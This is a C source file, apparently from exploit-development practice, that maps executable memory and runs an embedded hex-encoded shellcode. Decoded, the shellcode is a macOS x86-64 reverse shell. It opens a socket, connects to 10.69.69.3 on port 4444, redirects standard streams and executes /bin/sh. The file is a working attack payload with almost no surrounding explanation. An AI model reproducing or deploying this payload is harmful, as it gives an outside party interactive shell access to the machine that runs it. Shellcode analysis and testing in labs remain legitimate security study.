//Jacob Hammack
//Shellcode executor template from: http://www.thexploit.com/sploitdev/testing-your-shellcode-on-a-non-executable-stack-or-heap/

#include <stdio.h>

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
 
int (*sc)();
 
char shellcode[] = "\x48\x31\xDB\x48\x31\xD2\x48\xB8\x61\x00\x00\x02\x00\x00\x00\x00\x48\xBF\x02\x00\x00\x00\x00\x00\x00\x00\x48\xBE\x01\x00\x00\x00\x00\x00\x00\x00\x48\x89\xD2\x0F\x05\x49\x89\xC4\x49\xBD\x02\x00\x11\x5C\x0A\x45\x45\x03\x41\x55\x49\x89\xE5\x48\xB8\x62\x00\x00\x02\x00\x00\x00\x00\x4C\x89\xE7\x4C\x89\xEE\x48\xBA\x10\x00\x00\x00\x00\x00\x00\x00\x0F\x05\x48\x31\xF6\x48\xB8\x5A\x00\x00\x02\x00\x00\x00\x00\x4C\x89\xE7\x0F\x05\x48\x83\xFE\x02\x48\xFF\xC6\x76\xE8\x49\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x41\x50\x48\x89\xE7\x48\xB8\x3B\x00\x00\x02\x00\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05";

 
int main(int argc, char **argv) 
{
 
    void *ptr = mmap(0, strlen(shellcode), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
 
    if (ptr == MAP_FAILED) 
    {
        perror("mmap");
        exit(-1);
    }
 
    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;
 
    sc();
 
    return 0;
}
